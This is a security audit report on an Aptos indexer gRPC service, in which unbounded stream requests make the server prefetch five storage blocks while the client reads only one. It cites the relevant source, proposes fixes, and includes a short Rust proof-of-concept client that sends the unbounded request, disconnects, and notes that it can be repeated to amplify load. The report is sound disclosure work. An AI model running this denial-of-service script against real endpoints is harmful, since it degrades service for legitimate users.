# Audit Report

## Title
Resource Amplification Attack in Indexer GRPC Data Service via Unbounded Stream Requests

## Summary
The indexer GRPC data service performs excessive upfront computation when handling streaming transaction requests with unspecified transaction counts. A small health check request can trigger the server to spawn multiple concurrent file store fetch operations totaling thousands of transactions, while the client disconnects after receiving only the first batch, wasting significant server resources.

## Finding Description

The health check implementation in the `DataServiceGrpc` variant sends a `GetTransactionsRequest` with `starting_version: Some(0)` and `transactions_count: None` (indicating an infinite stream), then immediately disconnects after reading the first message. [1](#0-0) 

On the server side, when the requested data is evicted from cache and `transactions_count` is `None`, the implementation spawns `MAX_FETCH_TASKS_PER_REQUEST = 5` concurrent tasks to prefetch data from file storage. [2](#0-1) 

Each task fetches approximately 1000 transactions from the file store (determined by `TRANSACTIONS_PER_STORAGE_BLOCK`), and the server waits for all tasks to complete before returning results. [3](#0-2) 

The file store fetch operation is expensive, involving network I/O to cloud storage (S3/GCS) and CPU-intensive decompression/decoding. [4](#0-3) 

**Attack Path:**
1. Attacker sends `GetTransactionsRequest` with `starting_version=0`, `transactions_count=None`
2. If version 0 is evicted from cache, server spawns 5 concurrent file store fetch tasks
3. Server performs 5 network reads from cloud storage (versions 0, 1000, 2000, 3000, 4000)
4. Server waits for all 5 tasks to complete, decoding ~5000 transactions total
5. Attacker's client reads only the first message (`~1000 transactions`) and disconnects
6. Server has wasted resources fetching/decoding 4000+ unused transactions
7. Attacker can repeat this request to amplify resource consumption

This breaks the **Resource Limits** invariant (#9) - operations must respect computational and storage limits. The server performs unbounded prefetching without considering client consumption patterns or connection state.

## Impact Explanation

This is a **Medium Severity** vulnerability per Aptos bug bounty criteria:

- **Resource Exhaustion**: Causes significant waste of server resources (network I/O, CPU for decoding, memory)
- **Increased Costs**: Each malicious request triggers 5 cloud storage read operations, multiplying operational costs
- **Service Degradation**: Under sustained attack, could exhaust file store rate limits or server capacity, affecting legitimate indexer users
- **API Availability Impact**: Could degrade or crash the indexer API service

While this doesn't directly affect consensus, validator nodes, or funds (making it non-Critical), it does impact the availability and reliability of critical indexer infrastructure that applications depend on.

## Likelihood Explanation

**Likelihood: Medium-High**

- The indexer GRPC data service is intentionally exposed to external clients for transaction streaming
- No authentication is enforced at the service level (authentication expected at API gateway)
- In localnet/testnet deployments, the service may be directly accessible without authentication
- The attack requires only standard GRPC client capabilities
- The health check code itself demonstrates this pattern is actively used in production
- Cache eviction is a normal operational scenario (data rotates out of cache over time)

An attacker with network access to the indexer GRPC endpoint can trivially exploit this by sending repeated requests, each causing 5x resource amplification.

## Recommendation

**Implement lazy/incremental data fetching with connection state monitoring:**

1. **Fetch only one batch initially**: Don't prefetch multiple batches until the client has consumed the first batch
2. **Check connection state**: Before fetching additional batches, verify the client connection is still active
3. **Respect backpressure**: Use GRPC stream backpressure signals to fetch data on-demand
4. **Add rate limiting**: Implement per-client rate limiting on the number of concurrent requests

**Proposed fix for `get_data_with_tasks`**:

```rust
// Instead of spawning multiple tasks upfront when transactions_count is None,
// spawn only 1 task initially and fetch more as client consumes data
let num_tasks_to_use = match cache_coverage_status {
    Ok(CacheCoverageStatus::DataNotReady) => return DataFetchSubTaskResult::NoResults,
    Ok(CacheCoverageStatus::CacheHit(_)) => 1,
    Ok(CacheCoverageStatus::CacheEvicted) => {
        // Always start with 1 task for cache-evicted data, 
        // fetch more incrementally as client consumes
        1
    },
    Err(_) => { ... }
};
```

**Additional mitigation for health checks**:

Specify `transactions_count: Some(1000)` in the health check request to limit the server's fetch scope: [5](#0-4) 

Change to:
```rust
let request = tonic::Request::new(GetTransactionsRequest {
    starting_version: Some(0),
    transactions_count: Some(1000), // Limit to one batch for health check
    ..Default::default()
});
```

## Proof of Concept

```rust
// Rust PoC demonstrating the resource amplification attack
use aptos_protos::indexer::v1::{GetTransactionsRequest, raw_data_client::RawDataClient};
use futures::StreamExt;
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer GRPC service
    let mut client = RawDataClient::connect("http://localhost:50051").await?;
    
    // Send request with infinite stream (transactions_count = None)
    let request = Request::new(GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: None, // Unbounded!
        batch_size: None,
        transaction_filter: None,
    });
    
    let mut stream = client.get_transactions(request).await?.into_inner();
    
    // Read only the first message, then drop the connection
    if let Some(response) = stream.next().await {
        println!("Received {} transactions", response?.transactions.len());
        // Connection closes here, but server has already fetched 5000 transactions
    }
    
    // Repeat this attack multiple times to amplify resource consumption
    // Each request causes server to fetch 5x more data than client consumes
    
    Ok(())
}
```

This PoC shows that a simple client can trigger disproportionate server-side resource consumption by exploiting the unbounded prefetch behavior.

### Citations

**File:** crates/aptos-localnet/src/health_checker.rs (L58-79)
```rust
            HealthChecker::DataServiceGrpc(url) => {
                let mut client = aptos_indexer_grpc_utils::create_data_service_grpc_client(
                    url.clone(),
                    Some(Duration::from_secs(5)),
                )
                .await?;
                let request = tonic::Request::new(GetTransactionsRequest {
                    starting_version: Some(0),
                    ..Default::default()
                });
                // Make sure we can stream the first message from the stream.
                client
                    .get_transactions(request)
                    .await
                    .context("GRPC connection error")?
                    .into_inner()
                    .next()
                    .await
                    .context("Did not receive init signal from data service GRPC stream")?
                    .context("Error processing first message from GRPC stream")?;
                Ok(())
            },
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L265-271)
```rust
        Ok(CacheCoverageStatus::CacheEvicted) => match transactions_count {
            None => MAX_FETCH_TASKS_PER_REQUEST,
            Some(transactions_count) => {
                let num_tasks = transactions_count / TRANSACTIONS_PER_STORAGE_BLOCK;
                num_tasks.clamp(1, MAX_FETCH_TASKS_PER_REQUEST)
            },
        },
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L278-320)
```rust
    let mut tasks = tokio::task::JoinSet::new();
    let mut current_version = start_version;

    for _ in 0..num_tasks_to_use {
        tasks.spawn({
            // TODO: arc this instead of cloning
            let mut cache_operator = cache_operator.clone();
            let file_store_operator = file_store_operator.clone();
            let request_metadata = request_metadata.clone();
            async move {
                get_data_in_task(
                    current_version,
                    chain_id,
                    &mut cache_operator,
                    file_store_operator,
                    request_metadata.clone(),
                    cache_storage_format,
                )
                .await
            }
        });
        // Storage is in block of 1000: we align our current version fetch to the nearest block
        current_version += TRANSACTIONS_PER_STORAGE_BLOCK;
        current_version -= current_version % TRANSACTIONS_PER_STORAGE_BLOCK;
    }

    let mut transactions: Vec<Vec<Transaction>> = vec![];
    while let Some(result) = tasks.join_next().await {
        match result {
            Ok(DataFetchSubTaskResult::Success(txns)) => {
                transactions.push(txns);
            },
            Ok(DataFetchSubTaskResult::NoResults) => {},
            Err(e) => {
                error!(
                    error = e.to_string(),
                    "[Data Service] Failed to get data from cache and file store."
                );
                panic!("Failed to get data from cache and file store.");
            },
            Ok(_) => unreachable!("Fetching from a single task will never return a batch"),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/mod.rs (L59-86)
```rust
    async fn get_transactions_with_durations(
        &self,
        version: u64,
        retries: u8,
    ) -> Result<(Vec<Transaction>, f64, f64)> {
        let io_start_time = std::time::Instant::now();
        let bytes = self.get_raw_file_with_retries(version, retries).await?;
        let io_duration = io_start_time.elapsed().as_secs_f64();
        let decoding_start_time = std::time::Instant::now();
        let storage_format = self.storage_format();

        let transactions_in_storage = tokio::task::spawn_blocking(move || {
            FileEntry::new(bytes, storage_format).into_transactions_in_storage()
        })
        .await
        .context("Converting storage bytes to FileEntry transactions thread panicked")?;

        let decoding_duration = decoding_start_time.elapsed().as_secs_f64();
        Ok((
            transactions_in_storage
                .transactions
                .into_iter()
                .skip((version % FILE_ENTRY_TRANSACTION_COUNT) as usize)
                .collect(),
            io_duration,
            decoding_duration,
        ))
    }
```
